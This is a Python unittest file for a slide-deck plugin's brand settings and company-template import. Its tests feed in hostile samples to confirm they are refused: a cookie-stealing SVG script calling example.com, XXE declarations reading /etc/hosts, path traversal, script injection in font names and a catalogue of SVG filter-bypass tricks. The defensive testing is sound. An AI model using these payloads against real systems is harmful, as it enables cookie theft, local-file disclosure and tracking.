"""Tests for the brand profile, its checks, and decks built on a company template.
Run: python3 -I -m unittest discover -s <plugin>/scripts/tests
"""
import json, os, re, shutil, sys, tempfile, unittest, zipfile
import xml.etree.ElementTree as ET

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

import brand as B  # noqa: E402
from zoffice import check as C, ooxml as X, pptx as P, template as T  # noqa: E402
from test_office import STORY, VISUALS  # noqa: E402


def write_brand(d, data):
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "brand.json"), "w", encoding="utf-8") as f:
        json.dump(data, f)
    return d


class Profile(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def test_default_when_no_brand(self):
        b = B.load(start=self.tmp)
        self.assertIsNone(b["_dir"])
        self.assertEqual(b["colors"]["ink"], "#242424")
        self.assertIsNone(b["colors"]["accent"])
        self.assertEqual(b["credit"], "Charts by Zebra BI")
        self.assertEqual(B.check(b), ([], []))

    def test_company_brand_found_from_story_dir_and_merged(self):
        write_brand(os.path.join(self.tmp, ".zebra", "brand"), {"name": "Acme", "colors": {"accent": "#5B2C83"}, "kicker": "ACME INSIGHT"})
        story_dir = os.path.join(self.tmp, ".zebra", "stories", "q3")
        os.makedirs(story_dir)
        b = B.load(start=story_dir)
        self.assertEqual(b["name"], "Acme")
        self.assertEqual(b["colors"]["accent"], "#5B2C83")
        self.assertEqual(b["colors"]["ink"], "#242424")  # falls back to the default
        self.assertEqual(b["kicker"], "ACME INSIGHT")

    def test_errors(self):
        bad = B.merge(B.load(start=self.tmp), {"colors": {"ink": "#EEEEEE", "muted": "red"}, "logo": {"png": "/nope.png"}})
        errors, _ = B.check(bad)
        self.assertTrue(any("colors.muted" in e for e in errors), errors)
        bad = B.merge(B.load(start=self.tmp), {"colors": {"ink": "#EEEEEE"}})
        errors, _ = B.check(bad)
        self.assertTrue(any("contrast" in e for e in errors), errors)
        bad = B.merge(B.load(start=self.tmp), {"logo": {"png": "/no/such/logo.png"}})
        self.assertTrue(any("does not exist" in e for e in B.check(bad)[0]))

    def test_accent_close_to_variance_colours_warns(self):
        for accent, word in (("#7ACA00", "green"), ("#E8001C", "red"), ("#0B6FC0", "blue")):
            b = B.merge(B.load(start=self.tmp), {"colors": {"accent": accent}})
            errors, warnings = B.check(b)
            self.assertEqual(errors, [])
            self.assertTrue(any(word in w for w in warnings), (accent, warnings))
        b = B.merge(B.load(start=self.tmp), {"colors": {"accent": "#5B2C83"}})  # purple: no clash
        self.assertEqual(B.check(b), ([], []))

    def test_files_must_stay_inside_the_brand_folder(self):
        bdir = write_brand(os.path.join(self.tmp, "brand"), {"logo": {"file": "../../etc/secret.png"}, "deck": {"template": "/etc/hosts"}})
        b = B.load(brand_dir=bdir)
        self.assertIsNone(b["logo"]["png"])
        self.assertIsNone(b["deck"]["template"])
        errors, _ = B.check(b)
        self.assertEqual(sum("outside the brand folder" in e for e in errors), 2, errors)

    def test_font_names_cannot_carry_markup(self):
        b = B.merge(B.load(start=self.tmp), {"fonts": {"body": {"family": "Arial", "fallback": "x}</style><script>alert(1)</script>"}}})
        errors, _ = B.check(b)
        self.assertTrue(any("fonts.body.fallback" in e for e in errors), errors)
        import story as S
        css = S.brand_tokens(b)["BRAND_CSS"]
        self.assertNotIn("<", css)
        self.assertNotIn("}", css)

    def test_uncommon_font_and_no_credit_warn(self):
        b = B.merge(B.load(start=self.tmp), {"fonts": {"headline": {"family": "Acme Grotesk"}}, "credit": ""})
        errors, warnings = B.check(b)
        self.assertEqual(errors, [])
        self.assertTrue(any("Acme Grotesk" in w for w in warnings))
        self.assertTrue(any("credit" in w for w in warnings))


class WebFonts(unittest.TestCase):
    """P2 24: a brand that loads a remote stylesheet says so, and names the host every PDF build will contact."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def check(self, web_css):
        bdir = write_brand(os.path.join(self.tmp, "brand"), {"fonts": {"web_css": web_css}})
        return B.check(B.load(brand_dir=bdir))

    def test_remote_stylesheet_warns_and_names_the_host(self):
        errors, warnings = self.check("https://fonts.googleapis.com/css2?family=Inter")
        self.assertEqual([e for e in errors if "web_css" in e], [])
        self.assertTrue(any("fonts.googleapis.com" in w and "network" in w for w in warnings), warnings)

    def test_anything_but_https_is_an_error(self):
        for bad in ("http://example.com/a.css", "javascript:alert(1)", "//example.com/a.css", "https://"):
            with self.subTest(web_css=bad):
                errors, _ = self.check(bad)
                self.assertTrue(any("fonts.web_css must be an https://" in e for e in errors), errors)

    def test_default_brand_loads_nothing(self):
        errors, warnings = B.check(B.load(start=self.tmp))
        self.assertFalse(any("web_css" in m for m in errors + warnings), errors + warnings)


class Templates(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.snaps = {k: os.path.join(X.ASSETS, "snapshot-placeholder.png") for k in VISUALS}

    def tearDown(self):
        shutil.rmtree(self.tmp)

    def company_template(self):
        """A stand-in for a company's template: a built deck turned 4:3, its layouts renamed, its slides left in."""
        deck = os.path.join(self.tmp, "deck.pptx")
        P.build(STORY, VISUALS, self.snaps, deck, "Source: test.", B.load(start=self.tmp))
        out = os.path.join(self.tmp, "company.pptx")
        names = {"Title": "Acme Cover", "Title Only": "Acme Headline", "Blank": "Acme Empty"}
        with zipfile.ZipFile(deck) as src, zipfile.ZipFile(out, "w") as dst:
            for n in src.namelist():
                data = src.read(n)
                if n == "ppt/presentation.xml":
                    data = re.sub(rb'<p:sldSz cx="\d+" cy="\d+"', b'<p:sldSz cx="9144000" cy="6858000"', data)
                if n.startswith("ppt/slideLayouts/slideLayout") and n.endswith(".xml"):
                    for a, b in names.items():
                        data = data.replace(('name="%s"' % a).encode(), ('name="%s"' % b).encode(), 1)
                dst.writestr(n, data)
        return out

    def test_default_base_layouts(self):
        base = T.default_base(B.load(start=self.tmp))
        self.assertEqual([l["name"] for l in base.layouts], ["Title", "Title Only", "Blank"])
        self.assertEqual(base.layout("title", None)["name"], "Title")
        self.assertEqual(base.layout("content", None)["name"], "Title Only")

    def test_inspect_template(self):
        info = T.inspect(self.company_template())
        self.assertEqual(info["size_in"], [10.0, 7.5])
        self.assertEqual([l["name"] for l in info["layouts"]], ["Acme Cover", "Acme Headline", "Acme Empty"])
        self.assertEqual(info["suggested"]["title"], "Acme Cover")
        self.assertEqual(info["theme_colors"]["dk1"], "#242424")

    def test_deck_on_company_template(self):
        bdir = write_brand(os.path.join(self.tmp, "brand"), {"name": "Acme", "deck": {
            "template": "company.pptx", "layouts": {"title": "Acme Cover", "content": "Acme Headline", "closing": "Acme Headline"}}})
        shutil.copyfile(self.company_template(), os.path.join(bdir, "company.pptx"))
        brand = B.load(brand_dir=bdir)
        self.assertEqual(B.check(brand)[0], [])
        out = os.path.join(self.tmp, "acme.pptx")
        P.build(STORY, VISUALS, self.snaps, out, "Source: test.", brand)
        errors, _, summary = C.check(out)
        self.assertEqual(errors, [])
        self.assertEqual(summary["addins"], {"charts": 1, "tables": 2})
        with zipfile.ZipFile(out) as z:
            slides = sorted(n for n in z.namelist() if re.fullmatch(r"ppt/slides/slide\d+\.xml", n))
            pres = z.read("ppt/presentation.xml").decode()
            rels2 = z.read("ppt/slides/_rels/slide2.xml.rels").decode()
            layout_of_2 = re.search(r'Target="\.\./slideLayouts/(slideLayout\d+\.xml)"', rels2).group(1)
            layout_xml = z.read("ppt/slideLayouts/" + layout_of_2).decode()
        self.assertEqual(len(slides), 1 + len(STORY["sections"]) + 1)  # the template's own slides are gone
        self.assertIn('cx="9144000" cy="6858000"', pres)               # its 4:3 size is kept
        self.assertIn('name="Acme Headline"', layout_xml)               # section slides use the mapped layout

    def test_template_with_macros_is_refused(self):
        src = self.company_template()
        bad = os.path.join(self.tmp, "macro.pptm")
        with zipfile.ZipFile(src) as z, zipfile.ZipFile(bad, "w") as out:
            for n in z.namelist():
                out.writestr(n, z.read(n))
            out.writestr("ppt/vbaProject.bin", b"\0")
        with self.assertRaises(ValueError):
            T.from_template(bad)

    def _with(self, extra_parts, layout_rel=None):
        src = self.company_template()
        out = os.path.join(self.tmp, "variant.pptx")
        with zipfile.ZipFile(src) as z, zipfile.ZipFile(out, "w") as dst:
            for n in z.namelist():
                data = z.read(n)
                if layout_rel and n == "ppt/slideLayouts/_rels/slideLayout2.xml.rels":
                    data = data.replace(b"</Relationships>", layout_rel.encode() + b"</Relationships>")
                dst.writestr(n, data)
            for n, data in extra_parts.items():
                dst.writestr(n, data)
        return out

    def test_template_keeps_design_parts_only(self):
        b = T.from_template(self._with({"customXml/item1.xml": b"<x/>", "ppt/embeddings/Book.xlsm": b"PK"}))
        self.assertFalse(any(p.startswith(("customXml/", "ppt/embeddings/", "ppt/slides/")) for p in b.parts))

    def test_template_layout_using_an_embedded_object_is_refused(self):
        rel = ('<Relationship Id="rIdX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/package" '
               'Target="../embeddings/Book.xlsm"/>')
        with self.assertRaises(ValueError):
            T.from_template(self._with({"ppt/embeddings/Book.xlsm": b"PK"}, rel))

    def test_template_external_image_is_refused(self):
        rel = ('<Relationship Id="rIdX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
               'Target="https://example.com/pixel.png" TargetMode="External"/>')
        with self.assertRaises(ValueError):
            T.from_template(self._with({}, rel))

    def test_ole_object_disguised_as_a_picture_is_refused(self):
        rel = ('<Relationship Id="rIdX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
               'Target="../media/fake.png"/>')
        png = open(os.path.join(X.ASSETS, "snapshot-placeholder.png"), "rb").read()
        with self.assertRaises(ValueError):
            T.from_template(self._with({"ppt/media/fake.png": png}, rel))

    def test_picture_whose_bytes_are_not_its_format_is_refused(self):
        with self.assertRaises(ValueError):
            T.from_template(self._with({"ppt/media/evil.png": b"\xd0\xcf\x11\xe0 an OLE compound file"}))

    def test_template_cannot_relabel_a_part(self):
        src = self.company_template()
        out = os.path.join(self.tmp, "relabel.pptx")
        with zipfile.ZipFile(src) as z, zipfile.ZipFile(out, "w") as dst:
            for n in z.namelist():
                data = z.read(n)
                if n == "[Content_Types].xml":
                    data = data.replace(b'PartName="/ppt/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"',
                                        b'PartName="/ppt/theme/theme1.xml" ContentType="application/vnd.ms-office.activeX+xml"')
                dst.writestr(n, data)
        with self.assertRaises(ValueError):
            T.from_template(out)
        # Media keep our content types, never the template's.
        b = T.from_template(self.company_template())
        self.assertEqual(b.defaults.get("png"), "image/png")

    def test_placeholder_attributes_cannot_inject_xml(self):
        """A template's placeholder type and idx end up in our slides: only schema values are read, and they are escaped."""
        bad = ('<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:cSld><p:spTree>'
               '<p:sp><p:nvSpPr><p:cNvPr id="2" name="t"/><p:cNvSpPr/><p:nvPr>'
               '<p:ph type="title&quot;/&gt;&lt;p:evil/&gt;&lt;p:ph type=&quot;title"/></p:nvPr></p:nvSpPr><p:spPr/></p:sp>'
               '<p:sp><p:nvSpPr><p:cNvPr id="3" name="b"/><p:cNvSpPr/><p:nvPr>'
               '<p:ph type="body" idx="1&quot; evil=&quot;1"/></p:nvPr></p:nvSpPr><p:spPr/></p:sp>'
               '</p:spTree></p:cSld></p:sld>')
        self.assertEqual(T._placeholders(ET.fromstring(bad)), {})
        xml = P.placeholder(2, {"type": 'title"/><p:evil/>', "idx": '1" evil="1', "rect": None}, "Heading")
        ph = ET.fromstring('<r xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
                           'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">%s</r>' % xml)
        self.assertIsNone(ph.find(".//{http://schemas.openxmlformats.org/presentationml/2006/main}evil"))

    def test_ambiguous_zip_entries_are_refused(self):
        import warnings
        png = open(os.path.join(X.ASSETS, "snapshot-placeholder.png"), "rb").read()
        for extra in ({"ppt/media/A.png": png, "ppt/media/a.png": png},           # differ only in case
                      {"ppt/media/b%2Epng": png}):                                # percent-encoded name
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                with self.assertRaises(ValueError):
                    T.from_template(self._with(extra))

    def test_encoded_target_cannot_reach_a_dropped_part(self):
        rel = ('<Relationship Id="rIdX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
               'Target="../%65mbeddings/x.png"/>')
        png = open(os.path.join(X.ASSETS, "snapshot-placeholder.png"), "rb").read()
        with self.assertRaises(ValueError):
            T.from_template(self._with({"ppt/embeddings/x.png": png}, rel))

    def _replacing(self, name, data):
        """The company template with one existing part's bytes replaced."""
        src = self.company_template()
        out = os.path.join(self.tmp, "replaced.pptx")
        with zipfile.ZipFile(src) as z, zipfile.ZipFile(out, "w") as dst:
            self.assertIn(name, z.namelist())
            for n in z.namelist():
                dst.writestr(n, data if n == name else z.read(n))
        return out

    # P2 19: every SVG in ppt/media is copied into the deck, used or not, so each one is checked.
    SVG = b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">%s</svg>'

    def test_template_svg_with_a_script_is_refused(self):
        svg = self.SVG % b"<script>fetch('https://example.com/?'+document.cookie)</script>"
        with self.assertRaisesRegex(ValueError, "script"):
            T.from_template(self._with({"ppt/media/logo.svg": svg}))

    def test_template_svg_with_a_remote_picture_is_refused(self):
        for body in (b'<image xlink:href="https://example.com/pixel.png" width="1" height="1"/>',
                     b'<image href="//example.com/pixel.png"/>',
                     b'<rect style="fill:url(https://example.com/x.svg#p)" width="1" height="1"/>',
                     b'<style>@import url(https://example.com/a.css);</style>'):
            with self.subTest(body=body):
                with self.assertRaisesRegex(ValueError, "outside the file|from elsewhere"):
                    T.from_template(self._with({"ppt/media/logo.svg": self.SVG % body}))

    def test_template_svg_with_event_handlers_or_html_is_refused(self):
        for body, reason in ((b'<rect onload="alert(1)" width="1" height="1"/>', "event handlers"),
                             (b'<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>', "HTML")):
            with self.subTest(reason=reason):
                with self.assertRaisesRegex(ValueError, reason):
                    T.from_template(self._with({"ppt/media/logo.svg": self.SVG % body}))

    def test_template_svg_declaring_entities_is_refused(self):
        svg = (b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/hosts">]>'
               + self.SVG % b"<text>&x;</text>")
        with self.assertRaisesRegex(ValueError, "declares entities"):
            T.from_template(self._with({"ppt/media/logo.svg": svg}))

    def test_svg_check_bypasses_are_refused(self):
        """Ways around a byte-level check: another encoding, a namespace prefix, an external DTD, a link set by
        animation, a CSS picture without url(), and the SVG 1.2 script element."""
        utf16 = (b'<?xml version="1.0" encoding="UTF-16"?>' + self.SVG % b"<script>alert(1)</script>").decode().encode("utf-16")
        cases = {
            "UTF-16": utf16,
            "prefixed script": self.SVG % b'<svg:script xmlns:svg="http://www.w3.org/2000/svg">alert(1)</svg:script>',
            "prefixed foreignObject": self.SVG % b'<x:foreignObject xmlns:x="http://www.w3.org/2000/svg"/>',
            "SYSTEM DOCTYPE": b'<!DOCTYPE svg SYSTEM "https://example.com/evil.dtd">' + self.SVG % b"",
            "declared encoding": b'<?xml version="1.0" encoding="UTF-7"?>' + self.SVG % b"",
            "animated link": self.SVG % b'<a><animate attributeName="href" values="https://example.com/"/><text>x</text></a>',
            "image-set": self.SVG % b'<rect style="fill:image-set(\'https://example.com/a.png\' 1x)"/>',
            "handler element": self.SVG % b'<handler type="text/ecmascript">alert(1)</handler>',
            # What a parser sees, not what the bytes say: CDATA is joined, references and CSS escapes decoded.
            "CDATA-split @import": self.SVG % b'<style><![CDATA[@im]]><![CDATA[port "https://example.com/a.css";]]></style>',
            "entity @import": self.SVG % b'<style>@&#105;mport "https://example.com/a.css";</style>',
            "CSS-escaped url": self.SVG % b'<rect style="fill:u\\72l(https://example.com/p.svg#x)" width="1" height="1"/>',
            "entity attributeName": self.SVG % b'<a><animate attributeName="&#104;ref" values="https://example.com/"/></a>',
            "entity href": self.SVG % b'<image href="&#104;ttps://example.com/p.png" width="1" height="1"/>',
            "xml:base": self.SVG % b'<g xml:base="https://example.com/"><use href="#a"/></g>',
            "xml-stylesheet": b'<?xml-stylesheet type="text/css" href="https://example.com/a.css"?>' + self.SVG % b"",
            "presentation attribute": self.SVG % b'<rect fill="url(https://example.com/p.svg#g)" width="1" height="1"/>',
            "not well-formed": self.SVG % b"<rect>",
            # CSS keeps comments inside an unquoted url(): this is the path /**/, fetched, not a place in the file.
            "comment inside url()": self.SVG % b'<rect style="fill:url(/**/#x)" width="1" height="1"/>',
            "not an SVG root": b'<html xmlns="http://www.w3.org/1999/xhtml"><body/></html>',
            "meta refresh": self.SVG % b'<meta http-equiv="refresh" content="0;url=https://example.com/"/>',
            "invalid UTF-8": self.SVG % b"<text>\xff\xfe</text>",
            "EBCDIC": "<?xml version='1.0'?><svg/>".encode("cp037"),
        }
        for label, svg in cases.items():
            with self.subTest(label):
                self.assertIsNotNone(X.svg_problem(svg), label)
                with self.assertRaises(ValueError):
                    T.from_template(self._with({"ppt/media/logo.svg": svg}))

    def test_kept_part_in_another_encoding_is_refused(self):
        """A part PowerPoint parses but this code only scans: EBCDIC or broken UTF-8 could hide a DOCTYPE."""
        ebcdic = '<?xml version="1.0" encoding="IBM037"?><!DOCTYPE p [<!ENTITY x "y">]><p>&x;</p>'.encode("cp037")
        for data, reason in ((ebcdic, "does not start like UTF-8 XML"), (b"<p>\xc3\x28</p>", "not valid UTF-8")):
            with self.subTest(reason=reason):
                with self.assertRaisesRegex(ValueError, reason):
                    T.from_template(self._replacing("ppt/presProps.xml", data))

    def test_latin1_declared_svg_with_high_bytes_is_kept(self):
        svg = b'<?xml version="1.0" encoding="iso-8859-1"?>' + self.SVG % b"<title>Caf\xe9</title>"
        self.assertIsNone(X.svg_problem(svg))

    def test_utf16_kept_part_with_a_doctype_is_refused(self):
        evil = ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE p [<!ENTITY x "y">]>'
                '<p:presentationPr xmlns:p="x">&x;</p:presentationPr>').encode("utf-16")
        with self.assertRaisesRegex(ValueError, "not UTF-8"):
            T.from_template(self._replacing("ppt/presProps.xml", evil))

    def test_svg_with_the_public_svg_doctype_is_kept(self):
        """Illustrator writes the public SVG 1.1 DOCTYPE into every export; it declares nothing."""
        svg = (b'<?xml version="1.0" encoding="utf-8"?>\n<!-- Generator: Adobe Illustrator -->\n'
               b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
               + self.SVG % b'<path d="M0,0h10v10z"/>')
        self.assertIsNone(X.svg_problem(svg))
        b = T.from_template(self._with({"ppt/media/logo.svg": svg}))
        self.assertIn("ppt/media/logo.svg", b.parts)

    def test_template_plain_svg_is_kept(self):
        body = (b'<defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs>'
                b'<rect fill="url(#g)" width="10" height="10"/><use xlink:href="#g"/>'
                b'<image href="data:image/png;base64,iVBORw0KGgo=" width="1" height="1"/>')
        b = T.from_template(self._with({"ppt/media/logo.svg": self.SVG % body}))
        self.assertIn("ppt/media/logo.svg", b.parts)

    # P2 23: kept parts are copied whether or not they are parsed, so the guard covers every one of them.
    def test_doctype_in_a_kept_but_unparsed_part_is_refused(self):
        evil = b'<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x "y">]><a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">&x;</a:theme>'
        for part in ("ppt/theme/theme1.xml", "ppt/presProps.xml"):
            with self.subTest(part=part):
                path = self._replacing(part, evil)
                with self.assertRaisesRegex(ValueError, "DOCTYPE"):
                    T.from_template(path)

    def test_brand_check_reports_a_doctype_in_the_template(self):
        bdir = write_brand(os.path.join(self.tmp, "brand"), {"deck": {"template": "company.pptx"}})
        evil = b'<!DOCTYPE p [<!ENTITY x SYSTEM "file:///etc/hosts">]><p:presentationPr xmlns:p="x">&x;</p:presentationPr>'
        shutil.copyfile(self._replacing("ppt/presProps.xml", evil), os.path.join(bdir, "company.pptx"))
        errors, _ = B.check(B.load(brand_dir=bdir))
        self.assertTrue(any("DOCTYPE" in e for e in errors), errors)

    def test_svg_logo_with_a_remote_reference_is_refused(self):
        src = os.path.join(self.tmp, "logo.svg")
        with open(src, "wb") as f:
            f.write(self.SVG % b'<image xlink:href="https://example.com/track.png" width="1" height="1"/>')
        with self.assertRaisesRegex(ValueError, "outside the file"):
            B.store_logo(src, os.path.join(self.tmp, "brand"))
        self.assertFalse(os.path.exists(os.path.join(self.tmp, "brand", "logo.svg")))

    def test_brand_check_reports_a_hand_placed_svg_logo_with_a_script(self):
        bdir = write_brand(os.path.join(self.tmp, "brand"), {"logo": {"file": "logo.svg"}})
        with open(os.path.join(bdir, "logo.svg"), "wb") as f:
            f.write(self.SVG % b"<script>alert(1)</script>")
        errors, _ = B.check(B.load(brand_dir=bdir))
        self.assertTrue(any("carries a script" in e for e in errors), errors)

    def test_unknown_layout_is_an_error(self):
        bdir = write_brand(os.path.join(self.tmp, "brand"), {"deck": {"template": "company.pptx", "layouts": {"title": "Nope"}}})
        shutil.copyfile(self.company_template(), os.path.join(bdir, "company.pptx"))
        errors, _ = B.check(B.load(brand_dir=bdir))
        self.assertTrue(any("Nope" in e for e in errors), errors)



def ph(sid, typ, idx, x, y, cx, cy):
    """A layout placeholder at a position given in inches."""
    t = ' type="%s"' % typ if typ else ""
    e = lambda v: int(v * P.EMU)
    return ('<p:sp><p:nvSpPr><p:cNvPr id="%d" name="P%d"/><p:cNvSpPr><a:spLocks noGrp="1"/></p:cNvSpPr><p:nvPr><p:ph%s idx="%d"/>'
            '</p:nvPr></p:nvSpPr><p:spPr><a:xfrm><a:off x="%d" y="%d"/><a:ext cx="%d" cy="%d"/></a:xfrm></p:spPr>'
            '<p:txBody><a:bodyPr/><a:lstStyle/><a:p/></p:txBody></p:sp>' % (sid, sid, t, idx, e(x), e(y), e(cx), e(cy)))


class ContentRegion(unittest.TestCase):
    """Company layouts often carry a caption or subheadline placeholder beside the main content placeholder."""
    setUp, tearDown, company_template = Templates.setUp, Templates.tearDown, Templates.company_template

    def layout_with(self, shapes, title_y=None):
        src = self.company_template()
        out = os.path.join(self.tmp, "regions.pptx")
        with zipfile.ZipFile(src) as z, zipfile.ZipFile(out, "w") as dst:
            for n in z.namelist():
                data = z.read(n)
                if n == "ppt/slideLayouts/slideLayout2.xml":  # Acme Headline, the content layout
                    data = data.replace(b"</p:spTree>", shapes.encode() + b"</p:spTree>", 1)
                    if title_y is not None:
                        data = re.sub(rb'(<p:ph type="title"/>.*?<a:off x="\d+" y=")\d+',
                                      lambda m: m.group(1) + str(int(title_y * P.EMU)).encode(), data, count=1, flags=re.S)
                dst.writestr(n, data)
        bdir = write_brand(os.path.join(self.tmp, "brand"), {"name": "Acme", "deck": {"template": "company.pptx"}})
        shutil.copyfile(out, os.path.join(bdir, "company.pptx"))
        base = T.from_template(out)
        return base, base.layout("content", None), B.load(brand_dir=bdir)

    def build_and_check(self, brand):
        out = os.path.join(self.tmp, "acme.pptx")
        P.build(STORY, VISUALS, self.snaps, out, "Source: test.", brand)
        errors, _, _ = C.check(out)
        self.assertEqual(errors, [])
        with zipfile.ZipFile(out) as z:
            for n in z.namelist():
                if n.startswith("ppt/slides/slide"):
                    self.assertNotRegex(z.read(n).decode(), r'<a:ext cx="-|cy="-', n)

    def test_main_placeholder_wins_over_a_caption(self):
        base, lay, brand = self.layout_with(ph(20, None, 1, 0.75, 1.6, 11.8, 4.6) + ph(21, "body", 13, 0.75, 6.4, 11.8, 0.3))
        self.assertEqual(P.Geometry(base).region(lay), lay["ph"]["obj:1"]["rect"])
        self.build_and_check(brand)

    def test_short_subheadline_falls_back_under_the_title(self):
        base, lay, brand = self.layout_with(ph(20, "body", 13, 0.75, 1.5, 11.8, 0.5))
        g = P.Geometry(base)
        x, y, cx, cy = g.region(lay)
        self.assertNotEqual((x, y, cx, cy), lay["ph"]["body:13"]["rect"])
        self.assertGreaterEqual(cy, int(P.MIN_REGION * g.inch))
        self.build_and_check(brand)

    def test_largest_placeholder_not_the_first_key(self):
        base, lay, _ = self.layout_with(ph(20, None, 2, 0.75, 1.6, 8.5, 4.6) + ph(21, None, 10, 9.5, 1.6, 3.0, 3.0))
        self.assertEqual(P.Geometry(base).region(lay), lay["ph"]["obj:2"]["rect"])  # "obj:10" sorts first

    def test_layout_without_room_is_refused(self):
        base, lay, brand = self.layout_with("", title_y=6.4)
        with self.assertRaises(ValueError):
            P.build(STORY, VISUALS, self.snaps, os.path.join(self.tmp, "x.pptx"), "Source: test.", brand)

    def test_check_catches_a_negative_size(self):
        good = os.path.join(self.tmp, "good.pptx")
        P.build(STORY, VISUALS, self.snaps, good, "Source: test.", B.load(start=self.tmp))
        bad = os.path.join(self.tmp, "bad.pptx")
        with zipfile.ZipFile(good) as z, zipfile.ZipFile(bad, "w") as dst:
            for n in z.namelist():
                data = z.read(n)
                if n == "ppt/slides/slide2.xml":
                    data = re.sub(rb'(<a:ext cx="\d+" cy=")\d+', rb"\g<1>-1", data, count=1)
                dst.writestr(n, data)
        self.assertEqual(C.check(good)[0], [])
        self.assertTrue(any("negative size" in e for e in C.check(bad)[0]))


if __name__ == "__main__":
    unittest.main()
